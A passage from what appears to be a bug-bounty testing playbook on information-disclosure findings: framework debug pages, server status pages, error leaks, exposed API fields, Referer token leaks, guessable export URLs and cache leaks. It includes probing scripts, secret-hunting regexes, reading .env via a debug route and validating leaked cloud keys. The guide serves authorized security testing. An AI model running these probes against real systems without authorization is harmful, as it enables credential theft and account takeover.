  # 1. Laravel debug mode: a wrong verb throws MethodNotAllowedHttpException; no payload is needed
  curl -sS "${HDR[@]}" -X PATCH -H 'Accept: application/json' -o "$D/err.json" -w '%{http_code} %{size_download}\n' "$T/"
  curl -sS "${HDR[@]}" -X PATCH -o "$D/err.html" -w '%{http_code} %{size_download}\n' "$T/"
  grep -oE '"trace":|"exception":"[^"]+"|"file":"[^"]+"|Whoops|Ignition|APP_KEY|DB_PASSWORD|Environment &amp; details' "$D"/err.* | sort | uniq -c
  # 2. standing debug routes (GET)
  for p in /telescope/requests /horizon/api/stats '/_debugbar/open?max=5&offset=0' /_ignition/health-check /log-viewer \
           /_profiler/latest '/_profiler/empty/search/results?limit=10' /_profiler/phpinfo /app_dev.php/_profiler/latest \
           /debug/default/index /phpinfo.php /info.php /php.php /i.php /test.php /pi.php /php_info.php; do
    curl -sS "${HDR[@]}" -r 0-65535 -o "$D/p$(printf %s "$p" | tr '/?&=' '____')" -w "%{http_code} %{size_download} %{content_type} $p\n" "$T$p"; sleep "$W"; done
  curl -sSI "${HDR[@]}" "$T/" | grep -i '^x-debug-token'                # Symfony dev mode marks every response
  # 3. can one visitor read another visitor's request? Prove it with our own marked request, never with someone else's entry
  curl -sS "${HDR[@]}" -o /dev/null "$T/?$M=1"
  curl -sS "${HDR[@]}" -X POST -H 'Content-Type: application/json' -H 'Accept: application/json' -d '{"take":20}' \
    "$T/telescope/telescope-api/requests" | grep -o "$M" | head -1
  curl -sS "${HDR[@]}" "$T/_debugbar/open?max=20&offset=0" | grep -o "$M" | head -1       # then ?op=get&id=<id of that entry>
  curl -sS "${HDR[@]}" "$T/_profiler/empty/search/results?limit=20" | grep -o "$M" | head -1
  # 4. phpinfo: only the rows that can hold a secret
  sed 's/<[^>]*>/ /g' "$D/p_phpinfo.php" \
    | grep -E 'PHP Version|^ *(\$_(ENV|SERVER)\[.)?[A-Z0-9_]*(KEY|SECRET|PASSW|TOKEN|DATABASE_URL|DSN)[A-Z0-9_]*' | head -20
  ```
  The Symfony profiler also opens project files: `/_profiler/open?file=composer.json&line=1` proves it with a
  harmless file; `.env` through the same route is the secret. Read it once and redact.
- **Proof:** the debug page or JSON saved raw, with the framework marker and one secret by name (value cut to
  four characters each side); or our own marked request read back from Telescope, the profiler or the debug bar
  without a session, which shows that any visitor's cookies and form data are readable the same way.
- **Not a finding when:** a 405 or 500 with a generic page and no trace. `X-Powered-By: PHP/8.x` or a trace
  without secrets (`version-disclosure`). `phpinfo()` whose environment section holds no secret: low or
  informative, 27 reports carry it in the title and one was paid, $60 (#165930). Telescope or Horizon answering
  403 or redirecting to a login (the gate works). `APP_ENV=local` values that validate nowhere.
- **Escalate:** `APP_KEY` goes to DSR-009. A cloud or API key gets one read-only identity call and nothing more
  (`aws sts get-caller-identity` for an AWS key pair; INF-002 lists the others); database and mail passwords
  are reported unvalidated. A stored request of our own account B read from the debug store by an anonymous
  client is a session theft primitive: prove takeover on B only (#1883806 reached an admin account this way). A
  `phpinfo()` page echoes the request's cookies, including `HttpOnly` ones: with any XSS on the same origin it
  turns script execution into session theft. `/_ignition/execute-solution` on old Ignition is a known CVE: CVE
  chapter.

### INF-007 · Django or Rails runs in debug or development mode and its error and info pages print settings, routes and source

| | |
|---|---|
| **Severity** | Low standalone for a debug page that shows routes, paths and versions; High when it prints a live credential or the signing secret; Critical when an interactive console answers (file under RCE) |
| **Requires** | python\|ruby |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Debug Information · CWE-215 |
| **Prior art** | #1083543, #2965143, #1874836, #949686 |

- **Where:** Django: any missing path and any view that can be made to raise; `/__debug__/` (debug toolbar),
  `/silk/` (request profiler). Flask and other Werkzeug apps: the traceback page and `/console`. Rails:
  `/rails/info/routes`, `/rails/info/properties`, `/rails/mailers`, the routing-error page, `/letter_opener`,
  `/__better_errors`, `/sidekiq`. Staging and review hosts are where these are left on.
- **Test:** with `DEBUG = True` Django answers a missing path with its full URL configuration and an exception
  with frames, local variables, request data and the settings table. Names containing `API`, `KEY`, `PASS`,
  `SECRET`, `SIGNATURE` or `TOKEN` are starred out; everything else is printed, including connection URLs with
  a password inside (`DATABASE_URL`, `CELERY_BROKER_URL`, `REDIS_URL`) and local variables in the frames. Rails
  in development mode serves `/rails/info/*` and a routing-error page with the route table to every client.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-007"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); R="sane$RANDOM"
  # Django: a missing path lists the URLconf when DEBUG=True
  curl -sS "${HDR[@]}" -o "$D/dj-404.html" -w '%{http_code} %{size_download}\n' "$T/$R/"
  grep -oE 'DEBUG = True|Using the URLconf defined in [A-Za-z0-9_.]+|Django tried these URL patterns' "$D/dj-404.html" | sort -u
  # Django 500 page: input no view expects, no payload (bad UTF-8, an array for a scalar, an absurd page number)
  for q in '?page=%ff' '?id[]=1&limit=abc' '?page=99999999999999999999'; do
    curl -sS "${HDR[@]}" -g -o "$D/dj-500.html" -w "%{http_code} %{size_download} $q\n" "$T/<a dynamic route>$q"; sleep "$W"
    grep -q 'Exception Type' "$D/dj-500.html" && break; done
  python3 - "$D/dj-500.html" <<'PY'
  import html, re, sys
  t = open(sys.argv[1], encoding='utf-8', errors='replace').read()
  for k, v in re.findall(r'<td>([A-Z0-9_]+)</td>\s*<td class="code"><pre>(.*?)</pre>', t, re.S):
      v = html.unescape(v)                                  # a setting whose value Django did not star out
      if re.search(r'://[^/\s:@]+:[^@\s*]+@|[A-Za-z0-9+/_-]{32,}|BEGIN [A-Z ]*PRIVATE', v): print(k, '=', v[:14] + '...')
  PY
  # Rails development mode, debug toolbars, development mail viewers, the Werkzeug console
  for p in /rails/info/routes /rails/info/properties /rails/mailers /letter_opener /sidekiq /__better_errors /__debug__/ /silk/ /console; do
    curl -sS "${HDR[@]}" -r 0-65535 -o "$D/p$(printf %s "$p" | tr '/' '_')" -w "%{http_code} %{size_download} %{content_type} $p\n" "$T$p"; sleep "$W"; done
  grep -lE 'Rails version|Routes match in priority|Action Mailer Previews|letter_opener|Sidekiq|Better Errors|djDebug|Silk|Interactive Console|Werkzeug' "$D"/p_* 2>/dev/null
  ```
- **Proof:** the page saved raw with its marker text, and the strongest thing on it: a setting by name with its
  value cut to four characters each side, or the route table when nothing more is there. For `/letter_opener`:
  the reset mail of our own account B listed to a client with no session.
- **Not a finding when:** the 404 and 500 pages are custom or generic and carry at most a request id.
  `/rails/info/routes` answers 404 (production mode). The page is the Django REST framework browsable API or
  FastAPI's `/docs`: those are features and belong to the API chapter. `Server: gunicorn` or `X-Runtime`
  headers alone (`version-disclosure`). Every sensitive setting is starred and no frame holds a secret: routes
  and paths only, low or informative on most programmes (#2965143 and #1874836 were not paid).
- **Escalate:** a Django `SECRET_KEY` found in a frame or an unmasked alias goes to DSR-010 (pickled sessions)
  and to forging signed cookies for our own account; a Rails `secret_key_base` goes to DSR-011. A cloud or API
  key gets one read-only identity call and nothing more (`aws sts get-caller-identity` for an AWS key pair;
  INF-002 lists the others); connection URLs with database, SMTP or broker passwords are reported unvalidated
  (#1083543 listed AWS, SMTP and database secrets from one debug page). The URLconf and `/rails/info/routes`
  are the route list for the access-control chapter.
  `/letter_opener` with a reset link for B is account takeover on that deployment: authentication chapter. A
  Werkzeug console without a PIN, `web-console` or Better Errors' REPL is code execution: record a candidate
  and follow the RCE chapter's minimal proof.

### INF-008 · A web-server auto-index or status page is public and exposes non-public files or other clients' request URLs

| | |
|---|---|
| **Severity** | Low standalone for a listing or status page with nothing sensitive in it; Medium when it shows other clients' request URLs or non-public documents; High when a listed file holds a live credential or user data |
| **Requires** | !redirect-only |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Directory Listing · CWE-548 |
| **Prior art** | #301812, #684838, #2473173, #1860520 |

- **Where:** directories that appear in asset and download URLs (strip the file name from each crawled URL),
  plus `/uploads/`, `/files/`, `/backup/`, `/export/`, `/tmp/`, `/logs/`. Status pages: Apache `/server-status`
  and `/server-info`, nginx `/nginx_status`, PHP-FPM `/status?full`, HAProxy `/haproxy?stats`, Go
  `/debug/pprof/` and `/debug/vars`, Prometheus `/metrics`.
- **Test:** with no index file and `autoindex` on, the server lists the directory, including files nothing
  links to. Apache `mod_status` prints one row per worker with the client address, the virtual host and the
  first line of the request being served, which is other users' URLs with whatever tokens they carry. PHP-FPM
  `?full` and Go's `goroutine?debug=2` and `cmdline` expose the same kind of live state.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); M="sane-inf008-$RANDOM"
  # 1. directories from the crawl history plus the usual names
  { sed -E 's|^https?://[^/]+||; s|[?#].*||; s|/[^/]*$|/|' "$E/recon/$H/urls-history.txt" 2>/dev/null | sort -u | head -40
    printf '%s\n' /uploads/ /files/ /backup/ /backups/ /export/ /exports/ /tmp/ /logs/ /media/ /static/ /assets/ /download/ /includes/
  } | sort -u > "$D/dirs.txt"
  while read -r d; do
    curl -sS "${HDR[@]}" -r 0-65535 -o "$D/tmp.html" -w "%{http_code} $d\n" "$T$d" > "$D/tmp.code"; sleep "$W"
    grep -qiE '<title>Index of /|<h1>Index of|Directory listing for /|\[To Parent Directory\]|<ListBucketResult' "$D/tmp.html" \
      && { echo "LISTING $(cat "$D/tmp.code")"; cp "$D/tmp.html" "$D/list$(printf %s "$d" | tr '/' '_').html"; }
  done < "$D/dirs.txt"
  grep -ohE 'href="[^"?]+"' "$D"/list_*.html 2>/dev/null | grep -iE '\.(sql|zip|tar|t?gz|bak|log|csv|xlsx?|pem|key|env|conf|ini|ya?ml)"|backup|dump|export|invoice|passport'
  # 2. status pages; our own marked request shows whether one client's URL is visible to another
  curl -sS "${HDR[@]}" -o /dev/null "$T/?$M=1" &
  for p in /server-status '/server-status?auto' /server-info /nginx_status /basic_status '/status?full' /fpm-status '/haproxy?stats' /debug/pprof/ /debug/vars /metrics; do
    curl -sS "${HDR[@]}" -r 0-262143 -o "$D/st$(printf %s "$p" | tr '/?' '__')" -w "%{http_code} %{size_download} %{content_type} $p\n" "$T$p"; sleep "$W"; done
  grep -lE 'Apache Server Status|Total Accesses|Active connections:|process manager|Statistics Report for|/debug/pprof/|"cmdline"|# (HELP|TYPE) ' "$D"/st_* 2>/dev/null
  sed 's/<[^>]*>/ /g' "$D/st_server-status" | grep -cE '(GET|POST) /'            # request lines of all clients
  sed 's/<[^>]*>/ /g' "$D/st_server-status" | grep -E "$M|[?&](token|key|sid|session|auth|reset|code)=" | sed -E 's/(=[^& ]{4})[^& ]*/\1.../g' | head -5
  ```
  Do not request `/debug/pprof/profile` or `/debug/pprof/trace`: they run a 30-second profile on the server.
- **Proof:** for a listing: the listing page and one listed file that is not public elsewhere and matters,
  first lines only, redacted. For a status page: the page with our own marked request in it next to rows of
  other clients (addresses cut to the first two octets), and one request line whose query string carries a
  token, value redacted. Other users' tokens are never replayed.
- **Not a finding when:** the listing holds only assets the site links anyway (CSS, scripts, images), or it is
  an intended download or mirror directory. The status page shows only local health checks and static files.
  `/nginx_status` is seven counters; `/metrics` with runtime counters only is informative; `/status` returning
  `{"status":"ok"}` is a health check. A `<ListBucketResult>` is a bucket listing: file it under the cloud
  chapter. By title, 52 directory-listing and 11 status-page reports are in the index; none of the status-page
  reports was paid, and no listing on a host was paid for the listing itself.
- **Escalate:** listed backups, dumps and configuration files go through INF-002 and INF-003. A listing of
  users' uploads is a privacy finding: stop at the names (PB-14). Virtual-host names in `/server-status` feed
  the host-header chapter; token-bearing URLs seen there mean the application puts secrets in URLs, which is
  INF-011. A status page that answers only to local clients is a target for SSR-003.

### INF-009 · An error response to malformed input contains a credential, a signing secret or another user's data

| | |
|---|---|
| **Severity** | High standalone when the error body holds a live credential or signing secret; Medium for a connection string, internal token or query text with another user's data; None for a stack trace, path or version |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Exposure Through an Error Message · CWE-209 |
| **Prior art** | #460545, #335123, #147577, #2108342 |

- **Where:** endpoints that parse structured input: ids, dates, pagination and sort fields, JSON bodies, file
  names, search and export. Also the paths around the application's own error handler: old API versions, the
  API gateway, integration callbacks that call a third party and report its failure.
- **Test:** an error handler serializes the exception, and the exception carries what the code held when it
  failed: the SQL with bound values, the outbound request that was refused (URL with a key, an `Authorization`
  header), a dump of the configuration object, a signing secret. #460545 was one encoded character in one
  parameter that produced a page with `secret_key_base`; #335123 was a third-party API token inside an error
  message. Send one request per error class and read every body in full.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-009"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/api/items"                        # an endpoint from recon/$H/map.md that takes an id and a JSON body
  t(){ n=$1; shift; curl -sS -g "${HDR[@]}" -i -o "$D/$n.txt" -w "%{http_code} %{size_download} $n\n" "$@"; sleep "$W"; }   # add $A behind a login
  t baseline "$U/1"
  t badtype  "$U/abc";            t negative "$U/-1";           t huge "$U/99999999999999999999"
  t array    "$U?id[]=1&id[]=2";  t enc      "$U/%ff%fe";       t nul  "$U/1%00"
  t dateval  "$U?from=2024-13-45&sort=__nope__&limit=abc"
  t longval  "$U?q=$(head -c 9000 /dev/zero | tr '\0' a)"
  t method   -X PROPFIND "$U/1";  t accept   -H 'Accept: application/x-yaml' "$U/1"
  t badjson  -X POST -H 'Content-Type: application/json' -d '{"a":' "$U"
  t wrongct  -X POST -H 'Content-Type: application/xml' -d '<a/>' "$U"
  awk '{print FILENAME": "$0; nextfile}' "$D"/*.txt                                        # status line of each
  grep -lEi 'exception|traceback|stack ?trace|\.rb:[0-9]+|\.py", line|\.php on line|ORA-[0-9]{5}|SQLSTATE|syntax error at or near|\.java:[0-9]+\)' "$D"/*.txt
  grep -hoiE '(passw(or)?d|secret[a-z_]*|api[_-]?key|token|bearer |basic |jdbc:|(postgres(ql)?|mysql|mongodb(\+srv)?|redis|amqps?)://|AKIA[0-9A-Z]{16}|BEGIN [A-Z ]*PRIVATE KEY)[^ ]{0,60}' "$D"/*.txt | sort -u | head -40
  ```
  No injection payloads here: a database error after a quote character is a lead for the SQL chapter, not a
  disclosure.
- **Proof:** the request and the raw response with the secret's name and its value cut to four characters each
  side, and proof that it is live: one read-only identity call for a credential
  (`aws sts get-caller-identity` for an AWS key pair, `curl -sS -H "Authorization: Bearer <token>"
  https://api.github.com/user` for a GitHub token; INF-002 lists the others), or for a signing secret an
  offline check that it verifies our own cookie or token (no request needed).
- **Not a finding when:** the trace shows file paths, class names and framework versions only
  (`version-disclosure`). The message is SQL syntax text without data. The error echoes our own input or our
  own token back to us. The secret-looking word is a field name in a validation message ("password is too
  short"). The value is a request id, a Sentry event id or a public key. The page is the framework debug page:
  that is INF-006 or INF-007.
- **Escalate:** a signing secret goes to DSR-011, DSR-009 or JWT-004. An absolute path is the missing piece for
  the path-traversal chapter. An error that names an internal host and port ("connection refused to
  `http://10.0.3.7:8080`") is the oracle SSR-002 needs. SQL fragments go to the SQL chapter.

### INF-010 · An API response carries private fields of other users that the interface never displays

| | |
|---|---|
| **Severity** | Medium standalone for another user's e-mail address, phone number or similar personal data; High for a credential of another user (password hash, session, API or reset token, 2FA secret) or for payment and identity data; Low for internal ids and flags |
| **Requires** | api, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Privacy Violation · CWE-359 |
| **Prior art** | #509924, #2032716, #807448, #502753 |

- **Where:** every response that embeds another user's object: public profiles, member and collaborator lists,
  comment and review authors, user search and autocomplete, mention pickers, invite-by-username flows (#807448),
  mutation results that echo the affected users (#2032716), order, seller and driver objects, activity feeds.
  Also the wider serializers: the mobile API host, older API versions, `?include=`, `?expand=`, `?fields=`, and
  a `.json` suffix on an HTML route.
- **Test:** the server serializes the whole model and the client chooses what to draw. Put unique markers into
  the private fields of victim B (our second account: a phone number, a secondary e-mail, an address we
  invent), then read B's object as attacker A and with no session, and look for the markers and for private
  key names in the raw JSON. With a single account, that account is the victim and only the request without a
  session is a test.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-010"; mkdir -p "$D"
  # 1. B as B sees itself (control), B as A sees it and as nobody sees it (tests). Paths come from recon/$H/map.md.
  curl -sS "${HDR[@]}" $B "$T/api/v1/users/<B id>" -o "$D/01-control-B-own.json"
  curl -sS "${HDR[@]}" $A "$T/api/v1/users/<B id>" -o "$D/02-test-A-reads-B.json"
  curl -sS "${HDR[@]}"    "$T/api/v1/users/<B id>" -o "$D/03-test-anon-reads-B.json"
  # 2. the same object through list, search, embed and legacy routes
  for u in "/api/v1/users?search=<B display name>" "/api/v1/teams/<A team>/members" "/api/v1/comments?author=<B id>" \
           "/api/v1/users/<B id>?include=all&expand=profile&fields=*" "/api/v2/users/<B id>" "/users/<B id>.json"; do
    curl -sS -g "${HDR[@]}" $A "$T$u" -o "$D/10-$(printf %s "$u" | md5sum | cut -c1-8).json" -w "%{http_code} %{size_download} $u\n"; sleep 1; done
  # 3. B's markers and private-looking keys in everything A or nobody received
  grep -l -e '<B private e-mail>' -e '<B phone marker>' "$D"/02-*.json "$D"/03-*.json "$D"/10-*.json
  python3 - "$D"/02-*.json "$D"/03-*.json "$D"/10-*.json <<'PY'
  import json, re, sys
  PRIV = re.compile(r'mail|phone|mobile|address|birth|dob|ssn|passport|tax|iban|card|token|secret|passw|hash|salt|otp|mfa|2fa|reset|session|api_?key|(^|[._])ip([._]|$)|last_login|lat|lng|geo|device', re.I)
  def walk(o, p=''):
      if isinstance(o, dict):
          for k, v in o.items(): yield from walk(v, p + '.' + k)
      elif isinstance(o, list):
          for v in o[:3]: yield from walk(v, p + '[]')
      else: yield p, o
  for f in sys.argv[1:]:
      try: d = json.load(open(f))
      except Exception: continue
      for p, v in sorted({(p, str(v)[:40]) for p, v in walk(d)}):
          if PRIV.search(p) and v not in ('None', '', 'False'): print(f, p, '=', v)
  PY
  ```
- **Proof:** B's private value, which only B entered, in a response received by A or by a client with no
  session, next to B's own view and a note of what the interface shows for the same object. State the id format
  and whether ids can be enumerated. Do not enumerate, and do not read a second user.
- **Not a finding when:** the caller reads its own data. The field is public by product design (a profile that
  shows the e-mail address, business contact details, user name, avatar, join date). A and B share a tenant and
  A's role is meant to see the field. The value is masked or `null` for non-owners. The extra field is an
  internal id, a timestamp, a feature flag or a Gravatar hash. The only gain is knowing that an address has an
  account (`user-enum`).
- **Escalate:** a reset, session or API token of B in the object is account takeover: prove it on B and file it
  with the authentication chapter. A password hash is high without cracking it. Fields seen here and absent
  from the interface are the candidates for the mass-assignment items of the API chapter. On GraphQL the same
  test is GQL-003. If B's object should not be reachable by A at all, the stronger report is the access-control
  one.

### INF-011 · A page whose URL holds a secret sends that URL to a third party in the Referer header or an analytics beacon

| | |
|---|---|
| **Severity** | Medium standalone when a third party receives a still-valid share, invite or preview token; High when the token gives account access (password reset, magic login, session, OAuth code) and the attacker can be the receiving party; Low when the token is single-use and already spent |
| **Requires** | login, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Exposure Through Sent Data · CWE-201 |
| **Prior art** | #835437, #342709, #1491127, #1262434 |

- **Where:** pages reached through a link that carries the secret: password reset and e-mail verification,
  magic login, invitations and share links, unsubscribe and preference links, OAuth callbacks (`?code=`), URLs
  with a session id, signed download and "view invoice" links, preview links (#1262434). Trigger each for our
  own account and take the link from our own mailbox.
- **Test:** two channels. Referer: when that page loads a resource from another site or the user follows an
  outbound link, the browser sends `Referer`. Browsers default to `strict-origin-when-cross-origin`, which
  sends the origin only, so the full URL leaves only when the response or the element weakens the policy
  (`Referrer-Policy: unsafe-url` or `no-referrer-when-downgrade`, `<meta name="referrer" content="unsafe-url">`,
  a `referrerpolicy` attribute). Analytics: a script reads `location.href` and puts it into its own request
  (`dl=` for Google Analytics, a `url` or `page` field for others, session-replay recordings), whatever the
  referrer policy says. #1491127 and #269479 are that channel.
- **How:**
  ```python
  # inf011.py '<URL with our own token>' '<token value>' '<organisation domain>'
  import sys
  from urllib.parse import urlparse, unquote
  from playwright.sync_api import sync_playwright
  url, tok, org = sys.argv[1], sys.argv[2], sys.argv[3]
  HDRS = {}                                     # the programme's required header, sent to the organisation's hosts only
  mine = lambda u: (urlparse(u).hostname or '').endswith(org)
  with sync_playwright() as p:
      browser = p.chromium.launch(); page = browser.new_page(); reqs = []
      page.route('**/*', lambda r: r.continue_(headers={**r.request.headers, **HDRS}) if mine(r.request.url) else r.continue_())
      page.on('request', reqs.append)
      page.goto(url, wait_until='networkidle'); page.wait_for_timeout(5000)
      for r in reqs:
          if mine(r.url): continue
          try: body = r.post_data or ''
          except Exception: body = ''
          hit = [n for n, v in (('url', r.url), ('referer', r.all_headers().get('referer', '')), ('body', body)) if tok in unquote(v)]
          if hit: print(r.method, urlparse(r.url).hostname, 'token in', '+'.join(hit), '|', r.url[:110])
      print('outbound links:', len([h for h in page.eval_on_selector_all('a[href^="http"]', 'e => e.map(a => a.href)') if not mine(h)]))
      browser.close()
  ```
  ```bash
  D="$E/evidence/$H/INF-011"; mkdir -p "$D"; U='<URL with our own token>'
  python3 inf011.py "$U" '<token value>' '<organisation domain>' | tee "$D/third-party-requests.txt"
  # the policy in force on that page (use a fresh link: some tokens are spent by the first GET)
  curl -sS "${HDR[@]}" -D- -o "$D/page.html" "$U" | grep -iE '^(HTTP/|referrer-policy:|location:)'
  grep -oiE '<meta[^>]+name=.referrer.[^>]*>|referrerpolicy=.[a-z-]+' "$D/page.html"
  # is the token still usable after the third party has it? open the same link again in a clean client
  curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %{size_download}\n' "$U"
  ```
- **Proof:** the captured request to a host outside the organisation with our token in its URL, `Referer` or
  body; for the Referer channel the header or tag that sets the weak policy; and the token still accepted
  afterwards on our own account. Name the receiving party and say whether an attacker can become it.
- **Not a finding when:** the captured `Referer` is the origin only, which is the browser default: judge by the
  header that was sent, not by a missing `Referrer-Policy` header (`missing-headers`). The receiving host is the
  organisation's own. The token is spent or redirected away before any third-party request fires. The value is
  not a secret (a public share id, a tracking id). The receiver is a vendor under contract and the token is
  short-lived: expect low; #1491127 paid $500 for invitation tokens sent to an analytics service. "The URL
  could end up in proxy logs or browser history" with no receiving party is not accepted (`mitm`, `physical`).
- **Escalate:** when the page that holds the token also renders attacker-supplied content (an image in a
  comment, a link in a profile), the attacker's own server receives the Referer: that is account takeover for
  reset and login tokens and code theft for OAuth (#342709), proven against B. An open redirect on the same
  origin carries a URL fragment (`#access_token=`) to the attacker: redirect and OAuth chapters. URLs with
  tokens also end up in INF-008 status pages and INF-017 archives.

### INF-012 · An export, report or invoice file is served from a URL that needs no session and can be derived for other users

| | |
|---|---|
| **Severity** | High standalone when our second account's file is fetched without a session from a URL built from guessable parts; Medium when the guessable part needs one more value the attacker can look up; Low when the only weakness is an unguessable link that never expires |
| **Requires** | export, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Forced Browsing · CWE-425 |
| **Prior art** | #1044285, #1559739, #109815, #3467641 |

- **Where:** every feature that produces a file for one user: data export, report builder, invoice and receipt
  PDFs, statements, tickets, shipping labels, generated images. Follow the link in the interface, the link in
  the "your export is ready" e-mail, and the storage or CDN host either one redirects to.
- **Test:** generate two files as A a few seconds apart and one as B. Check whether the URL works with no
  session, whether it carries a signature and an expiry, and which parts differ between the three: a counter, a
  timestamp, a user id, a date, a hash or base64 of those, a time-based UUID. Build B's URL from A's pattern and
  from values A can know about B, and fetch it with no session.
- **How:**
  ```bash
  D="$E/evidence/$H/INF-012"; mkdir -p "$D"
  U1='<A export URL, first>'; U2='<A export URL, second>'; UB='<B export URL>'      # after any redirect: curl -sSIL shows the chain
  # 1. is a session needed, and is ownership checked?
  for u in "$U1" "$UB"; do curl -sS "${HDR[@]}" -o /dev/null -w "anon      %{http_code} %{size_download} %{content_type}\n" "$u"; done
  curl -sS "${HDR[@]}" $A -o /dev/null -w "A-reads-B %{http_code} %{size_download}\n" "$UB"
  # 2. which parts of the three URLs differ, and what they are made of
  python3 - "$U1" "$U2" "$UB" <<'PY'
  import sys, re, base64, uuid, urllib.parse as up
  for u in sys.argv[1:]:
      q = up.urlsplit(u); print(q.netloc + q.path, '| query keys:', sorted(up.parse_qs(q.query)))
      for x in re.findall(r'[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}', u):
          v = uuid.UUID(x).version; print('  ', x, '-> UUID v%s%s' % (v, ': time-based, neighbours can be computed' if v == 1 else ''))
      for x in re.split(r'[/._=&?-]', q.path + '&' + q.query):
          n = []
          if x.isdigit(): n.append('unix time' if len(x) in (10, 13) and x[0] == '1' else 'counter')
          if re.fullmatch(r'[0-9a-f]{32}', x): n.append('32 hex: try md5 of the id, the e-mail, id+date')
          if re.fullmatch(r'[0-9a-f]{40}', x): n.append('40 hex: try sha1 of the same')
          try:
              d = base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)).decode()
              if len(x) >= 8 and d.isprintable(): n.append('base64 of ' + d[:40])
          except Exception: pass
          if n: print('  ', x[:48], '->', '; '.join(n))
  PY
  # 3. a signed storage URL: does the object answer without the signature?
  curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %{size_download}\n' "${U1%%\?*}"
  # 4. B's URL derived from A's pattern, fetched with no session
  curl -sS "${HDR[@]}" -D "$D/03-test.headers" -o "$D/03-test-anon-derived-B.bin" -w '%{http_code} %{size_download} %{content_type}\n' '<derived B URL>'
  ```
  Check the storage host with `scripts/sane scope check` before step 3; a bucket outside the scope is handled
  through the cloud chapter's rules.
- **Proof:** B's file returned to a client with no session, from a URL the attacker computed, with the
  derivation written out step by step (A's two URLs, the rule, the value known about B). The triager must see
  that the URL was never obtained from B.
- **Not a finding when:** the path holds 128 bits of randomness (a version-4 UUID, a long random token): a
  link that works without a session is then a capability URL by design. It is informative, or low when it never
  expires on a sensitive document. The URL is pre-signed with a short expiry. A session is required and A is
  refused B's id (that is a clean access-control result). Only A's own files are reachable. The export holds
  nothing that is not already public.
- **Escalate:** a URL that needs a session and skips the ownership check is the access-control chapter's IDOR
  and is filed there (#1559739). A listable export directory is INF-008. Then test what the export contains: an
  export that includes objects A's role cannot open in the interface is the best-paid shape in this area
  (#186230 and #182358, internal attachments and activity inside "Export as .zip").

### INF-013 · A shared cache stores a response generated for a logged-in user and serves it to a client without that session

| | |
|---|---|
| **Severity** | Medium standalone when the stored response holds the account's personal data; High when it holds a session cookie, a CSRF token or an API token; None for a copy that exists only in the user's own browser |
| **Requires** | cache, login, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Use of Cache Containing Sensitive Information · CWE-524 |
| **Prior art** | #3082917, #263760, #132835, #231805 |

- **Where:** authenticated GET responses whose URL is the same for every user: `/api/me`, `/account`,
  `/settings`, the session or bootstrap call a single-page app makes on load, the HTML shell when it embeds the
  user object and a CSRF token. Also responses that set a cookie while declaring themselves cacheable: file,
  avatar and signed-blob routes (#3082917: `Set-Cookie` sent together with `Cache-Control: public`). Take the
  routes from `recon/$H/map.md`. Repeat on a sibling host only when it sits behind a different cache (other
  `Server`, `Via` or cache-status headers).
- **Test:** the cache keys on the URL, not on the session. When the application leaves `private` or `no-store`
  off a per-user response, or an edge rule caches by path or forces a lifetime, the copy made for one user is
  handed to the next client that asks for the same URL. Request the URL as A with a unique query parameter, so
  that the stored entry is ours alone, then request the identical URL with no session and look for A's data
  and a hit marker (`Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT`).
- **How:**
  ```bash
  D="$E/evidence/$H/INF-013"; mkdir -p "$D"; CB="inf013$RANDOM$RANDOM"
  M='<a value only account A holds, e.g. its e-mail address>'; S='<a static file the site links, e.g. /static/app.css>'
  # 0. is the query string part of the cache key? The same URL twice, then a new parameter: expect MISS, HIT, MISS
  for q in "$CB" "$CB" "${CB}b"; do
    curl -sS "${HDR[@]}" -D- -o /dev/null "$T$S?cb=$q" | grep -iE '^(age|x-cache|cf-cache-status|x-served-by):' | tr -d '\r' | tr '\n' ' '
    echo "<- ?cb=$q"; sleep 1; done
  # 1. per route: as A (fills the cache), as A again (a hit?), no session (the test), no session on a key A never used (control)
  n=0; for p in /api/me /account /settings/profile /api/v1/session; do n=$((n+1)); u="$T$p?cb=$CB"
    curl -sS "${HDR[@]}" $A -D "$D/$n-1-A.hdr"    -o "$D/$n-1-A.body"    "$u"; sleep 1
    curl -sS "${HDR[@]}" $A -D "$D/$n-2-A.hdr"    -o /dev/null           "$u"; sleep 1
    curl -sS "${HDR[@]}"    -D "$D/$n-3-anon.hdr" -o "$D/$n-3-anon.body" "$u"; sleep 1
    curl -sS "${HDR[@]}"    -D "$D/$n-4-ctrl.hdr" -o "$D/$n-4-ctrl.body" "$T$p?cb=${CB}c"; sleep 1
    echo "== $p  marker in A:$(grep -c -F "$M" "$D/$n-1-A.body") anon:$(grep -c -F "$M" "$D/$n-3-anon.body") control:$(grep -c -F "$M" "$D/$n-4-ctrl.body")"
    grep -iE '^(HTTP/|(cache-control|surrogate-control|cdn-cache-control|vary|age|x-cache|cf-cache-status|set-cookie):)' \
      "$D/$n-2-A.hdr" "$D/$n-3-anon.hdr" | sed -E 's/([Ss]et-[Cc]ookie: [^=]+=.{4})[^;]*/\1.../'
  done
  ```
  A hit on the third request of step 0 means the key ignores the query string: a request as A to
  `/api/me?cb=...` would be stored under the URL every real user asks for. Do not run step 1 on such routes.
  Use only routes whose path carries our own identifier (`/users/<A id>/summary`) and say in the report that the
  key ignores the query string.
